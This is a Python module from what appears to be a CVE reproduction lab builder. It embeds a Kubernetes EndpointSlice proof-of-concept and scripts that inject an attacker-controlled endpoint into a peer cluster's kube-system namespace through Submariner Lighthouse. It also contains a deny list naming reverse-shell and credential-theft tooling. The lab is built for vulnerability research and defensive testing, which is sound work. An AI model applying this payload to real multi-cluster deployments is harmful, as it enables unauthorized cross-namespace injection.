from __future__ import annotations

import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import tarfile
import uuid
from pathlib import Path, PurePosixPath
from urllib.parse import urlparse

from .ai import structured_response
from .core import collect_cve, normalize_cve, write_text


SOURCE_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": [
        "cwe", "confidence", "rationale", "fidelity", "exploit_contract", "docker_compose",
        "dockerignore", "vulnerable_dockerfile", "patched_dockerfile",
        "validator_dockerfile", "validator_py", "support_services", "adapter_files",
    ],
    "properties": {
        "cwe": {"type": "string"},
        "confidence": {"type": "number", "minimum": 0, "maximum": 1},
        "rationale": {"type": "string"},
        "fidelity": {
            "type": "object",
            "additionalProperties": False,
            "required": [
                "execution_level", "vendor_product_started",
                "exercised_vendor_components", "simulated_components", "rationale",
            ],
            "properties": {
                "execution_level": {
                    "type": "string",
                    "enum": ["source_component", "vendor_service", "product_end_to_end"],
                },
                "vendor_product_started": {"type": "boolean"},
                "exercised_vendor_components": {
                    "type": "array", "items": {"type": "string"},
                },
                "simulated_components": {
                    "type": "array", "items": {"type": "string"},
                },
                "rationale": {"type": "string"},
            },
        },
        "exploit_contract": {
            "type": "object",
            "additionalProperties": False,
            "required": ["attack_summary", "preconditions", "observable_effect", "evidence_type"],
            "properties": {
                "attack_summary": {"type": "string"},
                "preconditions": {"type": "array", "items": {"type": "string"}},
                "observable_effect": {"type": "string"},
                "evidence_type": {
                    "type": "string",
                    "enum": [
                        "authorization_bypass", "unauthorized_read", "unauthorized_write",
                        "code_execution", "request_forgery", "data_exposure",
                        "integrity_violation", "security_boundary_violation"
                    ],
                },
            },
        },
        "docker_compose": {"type": "string", "minLength": 1},
        "dockerignore": {"type": "string"},
        "vulnerable_dockerfile": {"type": "string", "minLength": 1},
        "patched_dockerfile": {"type": "string", "minLength": 1},
        "validator_dockerfile": {"type": "string", "minLength": 1},
        "validator_py": {"type": "string", "minLength": 1},
        "support_services": {
            "type": "array",
            "maxItems": 5,
            "items": {"type": "string", "pattern": "^[a-z][a-z0-9_-]{0,31}$"},
        },
        "adapter_files": {
            "type": "array",
            "maxItems": 10,
            "items": {
                "type": "object",
                "additionalProperties": False,
                "required": ["path", "content"],
                "properties": {
                    "path": {"type": "string"},
                    "content": {"type": "string"},
                },
            },
        },
    },
}

VULNERABLE_ONLY_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": [
        "cwe", "confidence", "rationale", "fidelity", "exploit_contract", "docker_compose",
        "dockerignore", "vulnerable_dockerfile", "validator_dockerfile",
        "validator_py", "support_services", "adapter_files",
    ],
    "properties": {
        key: SOURCE_SCHEMA["properties"][key]
        for key in (
            "cwe", "confidence", "rationale", "fidelity", "exploit_contract", "docker_compose",
            "dockerignore", "vulnerable_dockerfile", "validator_dockerfile",
            "validator_py", "support_services", "adapter_files",
        )
    },
}

DISCOVERY_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": [
        "status", "artifact_type", "repository_url", "vulnerable_ref", "fixed_ref",
        "vendor_artifact", "rationale", "evidence_urls",
    ],
    "properties": {
        "status": {
            "type": "string",
            "enum": ["SOURCE_READY", "VULNERABLE_ONLY", "VENDOR_ARTIFACT_REQUIRED", "INSUFFICIENT_DATA"],
        },
        "artifact_type": {"type": "string"},
        "repository_url": {"type": ["string", "null"]},
        "vulnerable_ref": {"type": ["string", "null"]},
        "fixed_ref": {"type": ["string", "null"]},
        "vendor_artifact": {"type": ["string", "null"]},
        "rationale": {"type": "string"},
        "evidence_urls": {"type": "array", "items": {"type": "string"}},
    },
}

GITHUB_COMMIT = re.compile(
    r"^https://github\.com/([^/]+)/([^/]+)/commit/([0-9a-f]{7,40})(?:[?#].*)?$",
    re.IGNORECASE,
)
GITLAB_COMMIT = re.compile(
    r"^(https://[^/]+/[^/]+/[^/]+?)/-/commit/([0-9a-f]{7,40})(?:[?#].*)?$",
    re.IGNORECASE,
)
ALLOWED_GENERATED = re.compile(
    r"^(docker-compose\.yml|\.dockerignore|(?:vulnerable|patched)/Dockerfile|"
    r"validator/(?:Dockerfile|validator\.py|requirements\.txt)|adapter/[A-Za-z0-9_.-]+)$"
)
FORBIDDEN = {
    "privileged:": "privileged containers",
    "network_mode: host": "host networking",
    "/var/run/docker.sock": "Docker socket mounting",
    "cap_add:": "additional Linux capabilities",
    "pid: host": "host PID namespace",
    "ipc: host": "host IPC namespace",
    "nc -e": "reverse-shell tooling",
    "netcat -e": "reverse-shell tooling",
    "/dev/tcp/": "shell network callbacks",
    "authorized_keys": "SSH persistence",
    "mimikatz": "credential theft tooling",
}

# Curated only after matching the public upstream diff to the CVE mechanism.
# Entries are immutable commit IDs so automatic runs remain reproducible even
# when the upstream default branch moves.
CURATED_SOURCES = {
    "CVE-2026-66788": {
        "repo": "https://github.com/submariner-io/lighthouse.git",
        "vulnerable_ref": "9ba8e0eeeacb42946379e503254487a0d69e0eb2",
        "fixed_ref": "e4f5bf97e048ad380d1c6b00b1e7fc596bc195af",
        "provenance": "Upstream namespace-validation security fix, 2026-08-11",
    },
}

LIGHTHOUSE_VULNERABLE_TEST = r'''package controller

import (
    "testing"

    "github.com/submariner-io/admiral/pkg/syncer"
    "github.com/submariner-io/lighthouse/pkg/constants"
    discovery "k8s.io/api/discovery/v1"
    metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func TestCVELabNamespaceInjection(t *testing.T) {
    endpointSlice := &discovery.EndpointSlice{ObjectMeta: metav1.ObjectMeta{
        Name: "cvelab-marker",
        Labels: map[string]string{constants.LabelSourceNamespace: "kube-system"},
    }}
    result, requeue := (&EndpointSliceController{}).onRemoteEndpointSlice(endpointSlice, 0, syncer.Create)
    if requeue || result == nil || result.(*discovery.EndpointSlice).Namespace != "kube-system" {
        t.Fatalf("expected vulnerable revision to accept attacker-controlled kube-system namespace")
    }
    t.Log("CVELAB: vulnerable upstream revision accepted kube-system destination")
}
'''

LIGHTHOUSE_PATCHED_TEST = r'''package controller

import (
    "testing"

    "github.com/submariner-io/admiral/pkg/syncer"
    "github.com/submariner-io/lighthouse/pkg/constants"
    discovery "k8s.io/api/discovery/v1"
    metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
    "k8s.io/apimachinery/pkg/runtime"
    dynamicfake "k8s.io/client-go/dynamic/fake"
)

func TestCVELabNamespaceInjection(t *testing.T) {
    endpointSlice := &discovery.EndpointSlice{ObjectMeta: metav1.ObjectMeta{
        Name: "cvelab-marker",
        Labels: map[string]string{constants.LabelSourceNamespace: "kube-system"},
    }}
    controller := &EndpointSliceController{
        localClient: dynamicfake.NewSimpleDynamicClient(runtime.NewScheme()),
        namespaceValidator: &NamespaceValidator{denyList: []string{"kube-", "openshift-", "openshift"}},
    }
    result, requeue := controller.onRemoteEndpointSlice(endpointSlice, 0, syncer.Create)
    if requeue || result != nil {
        t.Fatalf("expected fixed revision to reject attacker-controlled kube-system namespace")
    }
    t.Log("CVELAB: fixed upstream revision rejected kube-system destination")
}
'''

SOURCE_HEALTH_PY = r'''from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass
    def do_GET(self):
        body = b'{"ok":true}' if self.path == "/health" else b'not found'
        self.send_response(200 if self.path == "/health" else 404)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
'''

LIGHTHOUSE_VALIDATOR_PY = r'''import json
import pathlib
import sys

result_path = pathlib.Path(__file__).resolve().parents[1] / "e2e" / "result.json"
if not result_path.is_file():
    raise SystemExit("Missing authentic E2E result: run the lab before invoking the validator")

result = json.loads(result_path.read_text(encoding="utf-8"))
vulnerable = result.get("vulnerable", {})
patched = result.get("patched", {})
valid = (
    result.get("attack_executed") is True
    and result.get("proof_quality") == "end_to_end_security_effect_observed"
    and result.get("differential_confirmed") is True
    and vulnerable.get("confirmed") is True
    and "198.51.100.77" in vulnerable.get("evidence", "")
    and patched.get("confirmed") is False
    and patched.get("rejection_logged") is True
    and "Rejecting EndpointSlice" in patched.get("rejection_log", "")
)
print(json.dumps(result, indent=2))
sys.exit(0 if valid else 1)
'''

LIGHTHOUSE_E2E_POC_YAML = r'''apiVersion: v1
kind: Namespace
metadata:
  name: cvelab-source
---
apiVersion: v1
kind: Service
metadata:
  name: cvelab
  namespace: cvelab-source
spec:
  clusterIP: None
  ports:
    - name: http
      port: 8080
---
apiVersion: multicluster.x-k8s.io/v1alpha1
kind: ServiceExport
metadata:
  name: cvelab
  namespace: cvelab-source
---
apiVersion: discovery.k8s.io/v1
kind: EndpointSlice
metadata:
  name: cvelab-exploit
  namespace: cvelab-source
  labels:
    kubernetes.io/service-name: cvelab
    multicluster.kubernetes.io/service-name: cvelab
    endpointslice.kubernetes.io/managed-by: lighthouse-agent.submariner.io
    lighthouse.submariner.io/sourceNamespace: kube-system
addressType: IPv4
ports:
  - name: http
    protocol: TCP
    port: 8080
endpoints:
  - addresses: ["198.51.100.77"]
    conditions:
      ready: true
'''

LIGHTHOUSE_E2E_RUN_SH = r'''#!/usr/bin/env bash
set -euo pipefail

LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK_ROOT="/tmp/cvelab-CVE-2026-66788-e2e"
RESULT="$LAB_ROOT/e2e/result.json"
export PATH="$HOME/.local/bin:$PATH"
OWNERSHIP_FILE=""

safe_cleanup() {
  test -n "$OWNERSHIP_FILE" && test -s "$OWNERSHIP_FILE" || return 0
  while IFS='|' read -r kind name expected_id; do
    if [[ "$kind" == "container" ]]; then
      current_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker rm -fv "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign container $name: Docker ID changed." >&2
      fi
    elif [[ "$kind" == "network" ]]; then
      current_id="$(docker network inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker network rm "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign network $name: Docker ID changed." >&2
      fi
    fi
  done < "$OWNERSHIP_FILE"
  rm -f "$OWNERSHIP_FILE"
}

record_created_resources() {
  local network_preexisted="$1"
  : > "$OWNERSHIP_FILE"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    resource_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'container|%s|%s\n' "$name" "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  done
  if [[ "$network_preexisted" == "false" ]]; then
    resource_id="$(docker network inspect --format '{{.Id}}' kind 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'network|kind|%s\n' "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  fi
}

rm -rf "$WORK_ROOT"
mkdir -p "$WORK_ROOT"
# Shipyard's Dapper container mounts $HOME/.docker into /root/.docker.  Keep
# that mount isolated so tools running as root in the container cannot leave
# root-owned Buildx state in the invoking user's real Docker configuration.
mkdir -p "$WORK_ROOT/runner-home"
export HOME="$WORK_ROOT/runner-home"

run_variant() {
  local variant="$1"
  local expected="$2"
  local work="$WORK_ROOT/$variant"
  local network_preexisted=false
  # Keep the host Buildx state outside $HOME/.docker, which Dapper mounts into
  # its root-running container. Each variant receives a fresh configuration.
  export DOCKER_CONFIG="$WORK_ROOT/docker-config-$variant"
  mkdir -p "$DOCKER_CONFIG"
  OWNERSHIP_FILE="$work/.cvelab-owned-resources"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    if docker inspect "$name" >/dev/null 2>&1; then
      echo "Refusing to start: Docker container name $name is already in use." >&2
      return 4
    fi
  done
  if docker network inspect kind >/dev/null 2>&1; then
    network_preexisted=true
  fi
  cp -a "$LAB_ROOT/source/$variant/." "$work"
  while IFS= read -r -d '' text_file; do
    if grep -Iq $'\r' "$text_file"; then
      sed -i 's/\r$//' "$text_file"
    fi
  done < <(find "$work" -type f -print0)
  cat > "$work/.shipyard.e2e.yml" <<'YAML'
---
submariner: true
nodes: control-plane
clusters:
  cluster1:
  cluster2:
YAML
  cd "$work"
  git init -q
  git config user.name cvelab
  git config user.email cvelab@localhost
  git add -A
  git commit -qm "CVE lab source snapshot"
  local dapper_image="$variant:$(git branch --show-current)"

  if ! make deploy USING=wireguard; then
    record_created_resources "$network_preexisted"
    return 5
  fi
  record_created_resources "$network_preexisted"
  test "$(wc -l < "$OWNERSHIP_FILE")" -ge 3 || {
    echo "Unable to establish ownership of the Shipyard resources" >&2
    return 4
  }

  kubectl_tool() {
    docker run --rm --network kind \
      -v "$work:/workspace:ro" -v "$LAB_ROOT/e2e:/poc:ro" \
      --entrypoint /usr/sbin/kubectl "$dapper_image" "$@"
  }
  local host_k1="$work/output/kubeconfigs/kind-config-cluster1"
  local host_k2="$work/output/kubeconfigs/kind-config-cluster2"
  for kubeconfig in "$host_k1" "$host_k2"; do
    test -s "$kubeconfig" || { echo "missing kubeconfig: $kubeconfig" >&2; return 1; }
  done
  local k1="/workspace/output/kubeconfigs/kind-config-cluster1"
  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"

  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
    --for=condition=Valid serviceexport/cvelab --timeout=180s
  kubectl_tool --kubeconfig "$k2" -n cvelab-source annotate endpointslice cvelab-exploit \
    cvelab.io/nonce="$(date +%s%N)" --overwrite

  local observed=false
  local evidence="not created in peer kube-system namespace"
  local rejection_log=""
  for _ in $(seq 1 60); do
    if kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
        -l lighthouse.submariner.io/source-name=cvelab-exploit \
        -o json | grep -q '"198.51.100.77"'; then
      observed=true
      evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
        -l lighthouse.submariner.io/source-name=cvelab-exploit -o json)"
      break
    fi
    sleep 2
  done

  if [[ "$variant" == "patched" ]]; then
    local agent_logs
    agent_logs="$(kubectl_tool --kubeconfig "$k1" -n submariner-operator logs \
      -l app=submariner-lighthouse-agent --tail=500)"
    rejection_log="$(grep -F 'Rejecting EndpointSlice from cluster' <<< "$agent_logs" | tail -n 1 || true)"
    test -n "$rejection_log" || {
      echo "patched object was absent, but no explicit agent rejection was logged" >&2
      return 3
    }
  fi

  VARIANT="$variant" EXPECTED="$expected" OBSERVED="$observed" EVIDENCE="$evidence" REJECTION_LOG="$rejection_log" \
    python3 - <<'PY' > "$LAB_ROOT/e2e/$variant.json"
import json, os
print(json.dumps({
    "variant": os.environ["VARIANT"],
    "expected": os.environ["EXPECTED"] == "true",
    "confirmed": os.environ["OBSERVED"] == "true",
    "evidence": os.environ["EVIDENCE"][:8000],
    "rejection_logged": bool(os.environ["REJECTION_LOG"]),
    "rejection_log": os.environ["REJECTION_LOG"][:2000],
}, indent=2))
PY

  if [[ "$observed" != "$expected" ]]; then
    echo "unexpected $variant result: observed=$observed expected=$expected" >&2
    return 2
  fi

  safe_cleanup
}

cleanup() {
  safe_cleanup
}
trap cleanup EXIT

run_variant vulnerable true
run_variant patched false

LAB_ROOT="$LAB_ROOT" python3 - <<'PY' > "$RESULT"
import json, os, pathlib
root = pathlib.Path(os.environ["LAB_ROOT"]) / "e2e"
vulnerable = json.loads((root / "vulnerable.json").read_text())
patched = json.loads((root / "patched.json").read_text())
result = {
    "attack_executed": True,
    "proof_quality": "end_to_end_security_effect_observed",
    "observable_effect": "malicious spoke EndpointSlice propagated through the real broker into peer kube-system",
    "evidence_type": "authorization_bypass",
    "evidence_origin": "two-cluster kind deployment running upstream Lighthouse agent and broker flow",
    "vulnerable": vulnerable,
    "patched": patched,
    "differential_confirmed": vulnerable["confirmed"] and not patched["confirmed"] and patched["rejection_logged"],
}
print(json.dumps(result, indent=2))
PY
'''

LIGHTHOUSE_MANUAL_POC_SH = r'''#!/usr/bin/env bash
set -euo pipefail

LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK_ROOT="/tmp/cvelab-CVE-2026-66788-manual"
STATE="$WORK_ROOT/active-variant"
POC_FILE="$LAB_ROOT/artifacts/PoC.yaml"
export PATH="$HOME/.local/bin:$PATH"
OWNERSHIP_FILE="$WORK_ROOT/owned-resources"

# Dapper mounts $HOME/.docker into a root-running build container.  An
# isolated HOME prevents it from corrupting the user's Buildx state while the
# public images used by this lab do not require registry credentials.
mkdir -p "$WORK_ROOT/runner-home"
export HOME="$WORK_ROOT/runner-home"

safe_cleanup() {
  test -s "$OWNERSHIP_FILE" || return 0
  while IFS='|' read -r kind name expected_id; do
    if [[ "$kind" == "container" ]]; then
      current_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker rm -fv "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign container $name: Docker ID changed." >&2
      fi
    elif [[ "$kind" == "network" ]]; then
      current_id="$(docker network inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
      if [[ -n "$current_id" && "$current_id" == "$expected_id" ]]; then
        docker network rm "$current_id" >/dev/null 2>&1 || true
      elif [[ -n "$current_id" ]]; then
        echo "Skipping foreign network $name: Docker ID changed." >&2
      fi
    fi
  done < "$OWNERSHIP_FILE"
  rm -f "$OWNERSHIP_FILE"
}

record_created_resources() {
  local network_preexisted="$1"
  : > "$OWNERSHIP_FILE"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    resource_id="$(docker inspect --format '{{.Id}}' "$name" 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'container|%s|%s\n' "$name" "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  done
  if [[ "$network_preexisted" == "false" ]]; then
    resource_id="$(docker network inspect --format '{{.Id}}' kind 2>/dev/null || true)"
    if [[ -n "$resource_id" ]]; then
      printf 'network|kind|%s\n' "$resource_id" >> "$OWNERSHIP_FILE"
    fi
  fi
}

active_variant() {
  test -s "$STATE" || { echo "No manual lab is active. Run setup first." >&2; exit 2; }
  cat "$STATE"
}

prepare_source() {
  local variant="$1"
  local work="$WORK_ROOT/$variant"
  local network_preexisted=false
  # Do not let the root-running Dapper container mount the host Buildx state.
  export DOCKER_CONFIG="$WORK_ROOT/docker-config-$variant"
  mkdir -p "$DOCKER_CONFIG"
  for name in cluster1-control-plane cluster2-control-plane kind-registry; do
    if docker inspect "$name" >/dev/null 2>&1; then
      echo "Refusing to start: Docker container name $name is already in use." >&2
      return 4
    fi
  done
  if docker network inspect kind >/dev/null 2>&1; then
    network_preexisted=true
  fi
  test ! -e "$STATE" || { echo "A manual lab is already active. Run cleanup first." >&2; exit 2; }
  rm -rf "$work"
  mkdir -p "$work"
  cp -a "$LAB_ROOT/source/$variant/." "$work"
  while IFS= read -r -d '' text_file; do
    if grep -Iq $'\r' "$text_file"; then sed -i 's/\r$//' "$text_file"; fi
  done < <(find "$work" -type f -print0)
  cat > "$work/.shipyard.e2e.yml" <<'YAML'
---
submariner: true
nodes: control-plane
clusters:
  cluster1:
  cluster2:
YAML
  cd "$work"
  git init -q
  git config user.name cvelab
  git config user.email cvelab@localhost
  git add -A
  git commit -qm "CVE manual PoC source snapshot"
  if ! make deploy USING=wireguard; then
    record_created_resources "$network_preexisted"
    return 5
  fi
  record_created_resources "$network_preexisted"
  test "$(wc -l < "$OWNERSHIP_FILE")" -ge 3 || {
    echo "Unable to establish ownership of the Shipyard resources" >&2
    return 4
  }
  mkdir -p "$WORK_ROOT"
  printf '%s' "$variant" > "$STATE"
  echo "Manual $variant lab is ready and will remain running."
  echo "Next: run exploit, inspect PoC.yaml, then run verify."
}

kubectl_tool() {
  local variant work branch dapper_image
  variant="$(active_variant)"
  work="$WORK_ROOT/$variant"
  branch="$(git -C "$work" branch --show-current)"
  dapper_image="$variant:$branch"
  docker image inspect "$dapper_image" >/dev/null 2>&1 || {
    echo "Missing Shipyard utility image: $dapper_image" >&2
    return 2
  }
  docker run --rm --network kind \
    -v "$work:/workspace:ro" -v "$LAB_ROOT:/lab:ro" \
    --entrypoint /usr/sbin/kubectl "$dapper_image" "$@"
}

exploit() {
  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"
  test -f "$POC_FILE" || { echo "Missing $POC_FILE" >&2; exit 2; }
  kubectl_tool --kubeconfig "$k2" apply -f /lab/artifacts/PoC.yaml
  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
    --for=condition=Valid serviceexport/cvelab --timeout=180s
  kubectl_tool --kubeconfig "$k2" -n cvelab-source annotate endpointslice cvelab-exploit \
    cvelab.io/nonce="$(date +%s%N)" --overwrite
  echo "Payload submitted from cluster2/cvelab-source. Run verify next."
}

verify() {
  local variant k1 evidence
  variant="$(active_variant)"
  k1="/workspace/output/kubeconfigs/kind-config-cluster1"
  evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
    -l lighthouse.submariner.io/source-name=cvelab-exploit -o yaml)"
  if grep -q '198.51.100.77' <<< "$evidence"; then
    printf '%s\n' "$evidence"
    if [[ "$variant" == "vulnerable" ]]; then
      echo "REPRODUCED: attacker-controlled EndpointSlice reached cluster1/kube-system."
      return 0
    fi
    echo "FAILED: patched variant propagated the payload." >&2
    return 1
  fi
  if [[ "$variant" == "patched" ]]; then
    local logs rejection
    logs="$(kubectl_tool --kubeconfig "$k1" -n submariner-operator logs \
      -l app=submariner-lighthouse-agent --tail=500)"
    rejection="$(grep -F 'Rejecting EndpointSlice from cluster' <<< "$logs" | tail -n 1 || true)"
    test -n "$rejection" || {
      echo "INCONCLUSIVE: object absent but explicit patch rejection was not logged." >&2; return 1;
    }
    echo "$rejection"
    echo "BLOCKED: object absent and patched agent explicitly rejected the EndpointSlice."
    return 0
  fi
  echo "NOT REPRODUCED: vulnerable variant did not propagate the payload." >&2
  return 1
}

cleanup() {
  safe_cleanup
  rm -rf "$WORK_ROOT"
  echo "Manual lab removed."
}

action="${1:-}"
case "$action" in
  setup)
    variant="${2:-vulnerable}"
    [[ "$variant" == "vulnerable" || "$variant" == "patched" ]] || {
      echo "Variant must be vulnerable or patched." >&2; exit 2;
    }
    prepare_source "$variant"
    ;;
  exploit) exploit ;;
  verify) verify ;;
  cleanup) cleanup ;;
  *) echo "Usage: manual.sh {setup [vulnerable|patched]|exploit|verify|cleanup}" >&2; exit 2 ;;
esac
'''


def _run_git(arguments: list[str], cwd: Path | None = None, binary: bool = False):
    git = shutil.which("git")
    if not git:
        raise RuntimeError("Git was not found")
    text_options = (
        {"text": False}
        if binary
        else {"text": True, "encoding": "utf-8", "errors": "replace"}
    )
    completed = subprocess.run(
        [git, *arguments],
        cwd=cwd,
        capture_output=True,
        **text_options,
    )
    if completed.returncode:
        error = (
            completed.stderr or ""
            if not binary
            else (completed.stderr or b"").decode("utf-8", errors="replace")
        )
        raise RuntimeError(f"git {' '.join(arguments[:3])} failed: {error.strip()}")
    if completed.stdout is not None:
        return completed.stdout
    return b"" if binary else ""


def _safe_repo_url(value: str) -> str:
    parsed = urlparse(value)
    if parsed.scheme != "https" or not parsed.hostname or parsed.username or parsed.password:
        raise ValueError("Only public HTTPS repository URLs are accepted")
    if parsed.hostname.lower() not in {"github.com", "gitlab.com"}:
        raise ValueError("Automatic source retrieval currently supports GitHub and GitLab")
    return value.rstrip("/")


def resolve_source(dossier: dict, repo: str | None, fixed_ref: str | None) -> tuple[str, str] | None:
    if repo and fixed_ref:
        return _safe_repo_url(repo), fixed_ref
    curated = CURATED_SOURCES.get(dossier.get("cve", ""))
    if curated:
        return curated["repo"], curated["fixed_ref"]
    for reference in dossier.get("references", []):
        github = GITHUB_COMMIT.match(reference)
        if github:
            return f"https://github.com/{github.group(1)}/{github.group(2)}.git", github.group(3)
        gitlab = GITLAB_COMMIT.match(reference)
        if gitlab:
            return _safe_repo_url(gitlab.group(1) + ".git"), gitlab.group(2)
    return None


def discover_source_with_openai(dossier: dict, api_key: str | None, model: str | None) -> dict:
    return structured_response(
        api_key=api_key,
        model=model,
        schema=DISCOVERY_SCHEMA,
        schema_name="cvelab_source_discovery",
        max_output_tokens=5000,
        tools=[{"type": "web_search"}],
        include=["web_search_call.action.sources"],
        instructions=(
            "Research public provenance for an authorized local CVE reproduction. Search primary sources: the "
            "vendor advisory, upstream repository, GitHub/GitLab advisory, release notes, package registry, and "
            "exact fixing commits. SOURCE_READY requires a public HTTPS GitHub or GitLab repository and an exact "
            "immutable fixing commit supported by evidence; provide its parent or an evidenced affected commit as "
            "vulnerable_ref. VULNERABLE_ONLY requires an exact evidenced affected tag or commit but no exact public "
            "fix. If an affected revision is evidenced but the fixing commit is absent or ambiguous, you MUST return "
            "VULNERABLE_ONLY even when an advisory names a patched release. "
            "Use VENDOR_ARTIFACT_REQUIRED for proprietary products, appliances, operating systems, licensed "
            "installers, or authenticated downloads. Never invent URLs, versions, repositories, commit hashes, "
            "patches, or exploit details. If provenance is ambiguous, return INSUFFICIENT_DATA. Do not produce a "
            "payload or remote exploitation instructions."
        ),
        input_text=json.dumps(dossier, ensure_ascii=True),
    )


def _snapshot(repository: Path, revision: str, destination: Path) -> None:
    archive = _run_git(["archive", "--format=tar", revision], cwd=repository, binary=True)
    destination.mkdir(parents=True, exist_ok=True)
    with tarfile.open(fileobj=io.BytesIO(archive), mode="r:") as bundle:
        bundle.extractall(destination, filter="data")


def _source_context(repository: Path, vulnerable_ref: str, fixed_ref: str, dossier: dict) -> str:
    diff = _run_git(["diff", "--no-ext-diff", "--unified=80", vulnerable_ref, fixed_ref], cwd=repository)
    files = _run_git(["diff", "--name-only", vulnerable_ref, fixed_ref], cwd=repository).splitlines()
    tree = _run_git(["ls-tree", "-r", "--name-only", fixed_ref], cwd=repository).splitlines()
    useful_names = {
        "package.json", "pyproject.toml", "setup.py", "setup.cfg", "requirements.txt",
        "pom.xml", "build.gradle", "build.gradle.kts", "go.mod", "Cargo.toml", "composer.json",
        "Makefile", "README.md", "README", "Gemfile",
    }
    excerpts = []
    for path in list(dict.fromkeys(files + [item for item in tree if PurePosixPath(item).name in useful_names]))[:24]:
        try:
            content = _run_git(["show", f"{fixed_ref}:{path}"], cwd=repository)
        except RuntimeError:
            continue
        excerpts.append(f"\n--- FILE {path} (fixed revision) ---\n{content[:12000]}")
    material = {
        "dossier": dossier,
        "vulnerable_ref": vulnerable_ref,
        "fixed_ref": fixed_ref,
        "changed_files": files,
        "repository_tree_sample": tree[:500],
    }
    return json.dumps(material, ensure_ascii=True, indent=2) + "\n\n--- SECURITY PATCH ---\n" + diff[:90000] + "".join(excerpts)


def _canonicalize_compose_builds(content: str, vulnerable_only: bool = False) -> str:
    """Pin AI-generated Compose builds to the generated adapter layout."""
    layouts = {
        "vulnerable": (".", "vulnerable/Dockerfile"),
        "validator": ("./validator", "Dockerfile"),
    }
    if not vulnerable_only:
        layouts["patched"] = (".", "patched/Dockerfile")
    for service, (context, dockerfile) in layouts.items():
        service_pattern = re.compile(
            rf"(?ms)(^  {re.escape(service)}:\s*\n)(.*?)(?=^  [A-Za-z0-9_.-]+:\s*$|^networks:\s*$|\Z)"
        )
        service_match = service_pattern.search(content)
        if not service_match:
            raise RuntimeError(f"Compose service is missing: {service}")
        block = service_match.group(2)
        build_pattern = re.compile(r"(?m)^(    build:\s*\n)((?:      .*\n)*)")
        build_match = build_pattern.search(block)
        if not build_match:
            raise RuntimeError(f"Compose build block is missing for service: {service}")
        body = build_match.group(2)
        if re.search(r"(?m)^      context\s*:", body):
            body = re.sub(r"(?m)^      context\s*:.*$", f"      context: {context}", body, count=1)
        else:
            body = f"      context: {context}\n" + body
        if re.search(r"(?m)^      dockerfile\s*:", body):
            body = re.sub(
                r"(?m)^      dockerfile\s*:.*$",
                f"      dockerfile: {dockerfile}",
                body,
                count=1,
            )
        else:
            body = f"      dockerfile: {dockerfile}\n" + body
        canonical_build = build_match.group(1) + body
        block = block[:build_match.start()] + canonical_build + block[build_match.end():]
        content = content[:service_match.start(2)] + block + content[service_match.end(2):]
    return content


def _canonicalize_validator_dockerfile(content: str) -> str:
    """Make validator COPY sources relative to its isolated ./validator context."""
    replacements = {
        "COPY validator/validator.py ": "COPY validator.py ",
        "COPY ./validator/validator.py ": "COPY validator.py ",
        "COPY adapter/validator.py ": "COPY validator.py ",
        '"validator/validator.py"': '"validator.py"',
        '"./validator/validator.py"': '"validator.py"',
        '"adapter/validator.py"': '"validator.py"',
    }
    for source, target in replacements.items():
        content = content.replace(source, target)
    return content


def _validate_generated(files: list[dict], vulnerable_only: bool = False) -> None:
    paths = {item["path"].replace("\\", "/") for item in files}
    required = {
        "docker-compose.yml", "vulnerable/Dockerfile",
        "validator/Dockerfile", "validator/validator.py",
    }
    if not vulnerable_only:
        required.add("patched/Dockerfile")
    missing = required - paths
    if missing:
        raise RuntimeError(f"Generated adapter is missing: {', '.join(sorted(missing))}")
    for item in files:
        path = item["path"].replace("\\", "/")
        pure = PurePosixPath(path)
        if pure.is_absolute() or ".." in pure.parts or not ALLOWED_GENERATED.fullmatch(path):
            raise RuntimeError(f"Unsafe generated path rejected: {path}")
        lowered = item["content"].lower()
        for needle, reason in FORBIDDEN.items():
            if needle in lowered:
                raise RuntimeError(f"Generated adapter rejected: {reason} in {path}")
        if path in {"vulnerable/Dockerfile", "patched/Dockerfile"}:
            if "./gradlew" in item["content"] and not (
                "sed -i" in lowered and "\\r$" in item["content"]
            ):
                raise RuntimeError(
                    f"Generated Gradle Dockerfile must normalize Windows CRLF before execution: {path}"
                )
